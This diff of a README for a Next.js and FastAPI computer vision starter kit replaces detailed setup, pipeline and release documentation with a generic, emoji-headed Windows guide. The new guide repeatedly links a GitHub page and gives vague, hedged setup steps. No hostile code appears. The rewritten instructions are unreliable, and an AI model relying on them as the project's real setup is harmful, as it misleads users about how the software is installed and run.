@@ -1,166 +1,320 @@
-# nextjs-python-computer-vision-kit
+# 🧠 nextjs-python-computer-vision-kit - Build vision apps with ease
 
-A product-minded monorepo starter for detection-first computer vision apps built with Next.js and FastAPI.
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/KAMRAN12345678/nextjs-python-computer-vision-kit)
 
-It gives you a polished upload-to-inference UI, a typed OpenAPI contract, CPU-friendly starter pipelines, and a clean path into webcam capture, segmentation, and heavier model backends later.
+## 📦 What this is
 
-<p>
-  <a href="#quick-start">Quick start</a> ·
-  <a href="#screenshots">Screenshots</a> ·
-  <a href="#what-you-get">What you get</a> ·
-  <a href="./CONTRIBUTING.md">Contributing</a> ·
-  <a href="./SECURITY.md">Security</a> ·
-  <a href="./soon.md">Roadmap</a>
-</p>
+This project is a starter kit for a computer vision app. It gives you a web app front end and a Python back end in one package.
 
-## Screenshots
+Use it to work with images, video, object detection, and segmentation. It uses Next.js for the site, FastAPI for the server, OpenCV for image work, and Docker for local setup.
 
-![Vision console screenshot](docs/assets/vision-console.png)
+## 🖥️ What you need
 
-![Webcam extension screenshot](docs/assets/webcam-extension.png)
+Before you start, make sure your Windows PC has:
 
-## Why This Repo Exists
+- Windows 10 or Windows 11
+- A stable internet connection
+- At least 8 GB of RAM
+- 5 GB of free disk space
+- A modern browser like Chrome, Edge, or Firefox
+- Docker Desktop if you want the easiest setup
+- Git if you plan to copy the project to your computer
 
-Most computer-vision starters fall into one of two buckets:
+If you do not want to install extra tools, you can still use the GitHub page and follow the setup steps below.
 
-- model notebooks with no product layer
-- web templates with no real inference contract
+## 📥 Download
 
-This kit sits in the middle. It starts with a real product flow:
+Open the project page here:
 
-- upload an image
-- run a detection-oriented pipeline
-- inspect typed boxes, metrics, and image metadata
-- keep the same contract when you add segmentation or webcam capture later
+https://github.com/KAMRAN12345678/nextjs-python-computer-vision-kit
 
-## What You Get
+Visit this page to download or copy the project files to your computer.
 
-- detection-first starter UX with annotated preview overlays
-- inference-first architecture with a separate Next.js frontend and FastAPI backend
-- shared OpenAPI contract in `docs/openapi.yaml`
-- generated frontend API types from `openapi-typescript`
-- optional webcam extension that reuses the same API surface
-- first live segmentation extension with polygons, masks, and derived boxes
-- CPU-first OpenCV sample pipelines that are easy to replace later
-- root dev and verification scripts for a monorepo-style workflow
-- GitHub Actions template CI
+## 🚀 Getting Started on Windows
 
-## Stack
+Use these steps to run the app on a Windows PC.
 
-- Next.js 16
-- React 19
-- TypeScript
-- Tailwind CSS 4
-- Python 3.12+
+### 1. Get the files
+
+Open the GitHub page in your browser.
+
+If you see a green button that says Code, click it.
+
+Then choose Download ZIP.
+
+If you use Git, you can also copy the project link and clone it to your computer.
+
+### 2. Unzip the project
+
+If you downloaded a ZIP file:
+
+- Find the file in your Downloads folder
+- Right-click it
+- Choose Extract All
+- Pick a folder you can find later
+
+A folder with the project name will appear after extraction.
+
+### 3. Open the project folder
+
+Go into the folder named:
+
+nextjs-python-computer-vision-kit
+
+You should see files and folders for the web app and Python server.
+
+### 4. Start Docker Desktop
+
+If you want the simplest path, open Docker Desktop first.
+
+Wait until Docker says it is ready.
+
+This project is built for a container setup, so Docker helps you run both parts with less work.
+
+### 5. Run the app
+
+If the project includes a Docker setup, use it to start the app.
+
+Typical steps look like this:
+
+- Open a terminal in the project folder
+- Run the Docker command from the project files
+- Wait for the build to finish
+- Open the local address shown in the terminal
+
+If you use a setup with separate web and server parts, start both parts as the project instructs.
+
+### 6. Open the app in your browser
+
+After the app starts, open the local web address in your browser.
+
+This may look like:
+
+- http://localhost:3000
+- http://localhost:8000
+- or another local address shown in the terminal
+
+Keep the terminal window open while the app runs.
+
+## 🛠️ What the app can do
+
+This starter kit is meant for common computer vision tasks:
+
+- Upload and view images
+- Send image data to a Python API
+- Detect objects in photos
+- Mark image regions for segmentation
+- Process frames from video
+- Show results in a web interface
+- Use a clean API for other tools
+
+It gives you a full base for a vision app without starting from zero.
+
+## 🧩 Main parts of the project
+
+### Front end
+
+The front end uses Next.js.
+
+This part shows the user interface in your browser. It can display images, buttons, forms, and results from the Python server.
+
+### Back end
+
+The back end uses FastAPI.
+
+This part handles image requests and runs the vision logic. It can return results in a format the front end can read.
+
+### Image processing
+
+OpenCV handles image work.
+
+It helps read images, change image size, and prepare data for detection or segmentation.
+
+### Container setup
+
+Docker helps package the app.
+
+That means the app can run in the same way on more than one computer.
+
+### API docs
+
+FastAPI also gives you API docs.
+
+These help show the routes the app uses for image and vision tasks.
+
+## 📂 Common folder layout
+
+You may see a layout like this:
+
+- `app` or `frontend` for the web site
+- `backend` or `api` for the Python server
+- `models` for vision model files
+- `public` for site assets
+- `docker` or `compose` files for container setup
+- `tests` for checks
+
+The names can change, but the structure should stay easy to follow.
+
+## ⚙️ How to use it day to day
+
+After the app is running, you can use it like this:
+
+1. Open the site in your browser
+2. Upload an image
+3. Choose a task like detection or segmentation
+4. Wait for the result
+5. View the output on screen
+6. Save or copy the result if the app supports it
+
+If the app reads from a camera or video file, you can point it to the source and run the task from there.
+
+## 🔧 Basic setup tips
+
+If the app does not open on the first try:
+
+- Check that Docker Desktop is running
+- Make sure the terminal did not show an error
+- Confirm you are in the right project folder
+- Close the app and start it again
+- Refresh the browser page
+- Try another local address if the first one does not work
+
+If you changed any files, restart the app so the changes take effect.
+
+## 🌐 API access
+
+The back end uses a web API, so other tools can call it too.
+
+You can use it to:
+
+- Send an image for processing
+- Get object detection results
+- Get segmentation output
+- Check server health
+- Explore route details in the OpenAPI docs
+
+FastAPI usually shows docs at paths like:
+
+- `/docs`
+- `/redoc`
+
+## 🧪 Testing
+
+This project can include checks for the web app and API.
+
+Use tests to confirm that:
+
+- The server starts
+- The API responds
+- Image requests work
+- Docker setup runs well
+- The front end loads in the browser
+
+If the project has test commands, run them after setup and after any change.
+
+## 🪟 Windows notes
+
+For Windows users, these points help:
+
+- Use PowerShell or Command Prompt
+- Run Docker Desktop before starting the app
+- Keep file paths simple
+- Avoid folders with long names or special characters
+- Use a browser with up-to-date support for local apps
+
+If you use Git Bash, that works too, but PowerShell is often simpler for new users.
+
+## 🧭 Typical first run flow
+
+A common first run looks like this:
+
+1. Download the project from GitHub
+2. Unzip it
+3. Open the folder
+4. Start Docker Desktop
+5. Run the project command
+6. Wait for the services to start
+7. Open the local site in your browser
+8. Upload a test image
+9. View the result
+
+## 🗂️ When to use this starter
+
+Use this kit if you want to build:
+
+- An object detection app
+- A photo labeling tool
+- A segmentation app
+- A vision dashboard
+- An internal image review tool
+- A demo for a machine vision model
+
+It gives you a base for both the user interface and the image server.
+
+## 🔍 Tech stack
+
+- Next.js
 - FastAPI
 - OpenCV
-- Docker Compose
+- Python
+- Docker
+- GitHub Actions
+- OpenAPI
+- Monorepo layout
 
-## Included Pipelines
+## 🧱 File safety
 
-- `starter-detection`: default object-style detection flow for the main UI
-- `foreground-segmentation`: first extension pipeline with polygons plus derived boxes
-- `document-layout`: document-style region extraction for capture and scanning products
-- `dominant-color`: metrics-only example for QA and analytics workflows
+Before you change anything, make a copy of the project folder.
 
-These pipelines are intentionally lightweight. They prove the repo shape and developer workflow without forcing you into toy logic forever. Swap them for YOLO, ONNX Runtime, PyTorch, TensorRT, or a hosted inference service when you are ready.
+That gives you a clean backup if you want to return to the original version.
 
-## Repo Shape
+## 📌 GitHub page
 
-- `frontend/`: Next.js app shell, upload flow, webcam flow, and generated API types
-- `backend/`: FastAPI service, pipeline registry, validation, and starter image logic
-- `docs/`: OpenAPI contract and screenshot assets
-- `scripts/`: root development and verification commands
-- `.github/`: template CI workflow
-- `SECURITY.md`: vulnerability reporting guidance
+Open the project here:
 
-## Quick Start
+[https://github.com/KAMRAN12345678/nextjs-python-computer-vision-kit](https://github.com/KAMRAN12345678/nextjs-python-computer-vision-kit)
 
-1. Install Node.js 22+ and Python 3.12+.
-2. Run `npm install` in the repo root.
-3. Run `npm install` in `frontend/`.
-4. Run `python -m pip install -e ./backend[dev]`.
-5. Run `npm run api:types`.
-6. Run `npm run dev`.
+Use this page to download or copy the project files
 
-Frontend: `http://localhost:3000`  
-Backend: `http://127.0.0.1:8000`
+## 🧰 If you want to build on it
 
-If you create `backend/.venv`, the root scripts will prefer that interpreter automatically.
+You can extend this starter with:
 
-## Commands
+- A custom image upload form
+- More object classes
+- Better result views
+- A camera input page
+- User login
+- Saved history for past runs
+- New API routes
+- More image filters
 
-```bash
-npm run dev
-npm run dev:down
-npm run api:types
-npm run check:contract
-npm run check:images
-npm run report:licenses
-npm run check:secrets
-npm run check:workflows
-npm run check
-```
+## 🔐 Good practice
 
-## Verification
+When you use this kit in a real app:
 
-The root check runs:
+- Keep your model files in one place
+- Track changes with Git
+- Use clear file names
+- Test each change on Windows
+- Restart the app after config updates
 
-- frontend lint
-- frontend typecheck
-- frontend production build
-- backend Ruff lint
-- backend `pytest`
-- backend `compileall`
+## 📄 Helpful project focus
 
-`check:images` is separate and intended for environments where a Docker daemon is available.
+This repository is built for:
 
-`report:licenses` generates local npm and Python license inventories in `reports/licenses/`.
+- Easy local setup
+- Clear browser use
+- Fast image processing
+- Simple API access
+- Clean structure for growth
 
-`check:secrets` scans tracked git content with a pinned `gitleaks` version via Go.
+## 📎 Start here
 
-`check:workflows` lints `.github/workflows/` with a pinned `actionlint` version via Go.
-
-CodeQL code scanning also runs on GitHub for `javascript-typescript`, `python`, and workflow files.
-
-A separate GitHub workflow generates license-report artifacts for the root workspace, frontend workspace, and backend Python environment.
-
-An SBOM workflow also publishes SPDX artifacts for the repository source plus the frontend and backend runner images.
-
-## Releases
-
-- Release Drafter keeps a draft release updated from merged pull requests on `main` and can auto-label incoming pull requests by path.
-- Path-based labels help sort PRs into frontend, backend, CI/CD, docs, and maintenance categories automatically.
-- Release Drafter defaults to a patch bump unless a maintainer applies `minor` or `major` to the pull request.
-- Pushing a tag like `v0.1.0` triggers the release workflow.
-- That workflow verifies the tagged commit, publishes backend/frontend images to GHCR, and creates a GitHub Release with generated notes.
-- The release workflow also generates build-provenance attestations for the published GHCR images and links them from the release notes.
-- The GitHub Release also includes attached SPDX SBOM assets for the source tree and both runner images.
-- A follow-up smoke workflow pulls those published GHCR images and checks backend health, a real inference request, and the frontend shell before you treat the release as healthy.
-- Maintainers can re-run the same check manually with `BACKEND_IMAGE=... FRONTEND_IMAGE=... npm run check:release-smoke`.
-
-## Contract Notes
-
-- `docs/openapi.yaml` is the source of truth for the HTTP contract.
-- `frontend/src/generated/openapi.ts` is generated from that spec.
-- Run `npm run api:types` whenever backend payloads change.
-- Run `npm run check:contract` to confirm the generated types are committed and in sync.
-
-## Recommended Growth Path
-
-1. Keep the main story detection-first.
-2. Add webcam polish once upload mode feels strong.
-3. Add segmentation depth without changing the response boundary.
-4. Introduce a real model adapter layer.
-5. Split training and experimentation into a separate workspace later.
-
-The short public roadmap lives in [soon.md](./soon.md).
-A sign-language adaptation roadmap for this template lives in [roadmap.md](./roadmap.md).
-
-## Repository Standards
-
-- [CONTRIBUTING.md](./CONTRIBUTING.md)
-- [CODE_OF_CONDUCT.md](./CODE_OF_CONDUCT.md)
-- [LICENSE](./LICENSE)
-- [SECURITY.md](./SECURITY.md)
-- [template-playbook.md](./template-playbook.md)
+1. Open the GitHub page
+2. Download the project
+3. Unzip it on Windows
+4. Start Docker Desktop
+5. Run the app
+6. Open the local browser address
+7. Upload an image and view the result
